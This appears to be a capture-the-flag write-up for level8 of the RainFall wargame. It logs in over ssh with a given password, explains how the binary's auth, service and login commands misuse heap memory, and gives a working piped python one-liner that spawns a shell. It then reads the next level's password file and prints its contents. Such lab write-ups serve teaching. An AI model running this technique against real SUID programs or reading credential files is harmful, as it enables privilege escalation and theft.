login as the user `level8`

```shell
ssh -p 4242 level8@10.13.100.139
level8@10.13.100.139's password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
level8@RainFall:~$
```

a `SUID` exactable file is locates in the home directory


the program looks to declare 2 global variables `auth` and `service`, then reads from stdin to a buffer of size `128` using `fgets`.
it check's whether the input matches the 4 following command:
 - `auth `: allocates a string of 4 bytes in to the auth variable and copy's the content of the budder after `auth ` to it using `strcpy`.
 - `reset`: frees the auth variable
 - `service` : copy's the content after the "service" command into the service global variable using `strdup`
 - `login`: if auth[32] in null it prints `Password:\n`, else it spawns a shell


to exploit the program all we have to do is call the `auth` command then call the `service` command with 16 bytes of padding after, then we `login` to spawn a shell.


```shell
level8@RainFall:~$ (python -c "print 'auth '; print 'service' + 'A' * 16 ; print 'login'"; cat) | ./level8
(nil), (nil)
0x804a008, (nil)
0x804a008, 0x804a018
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
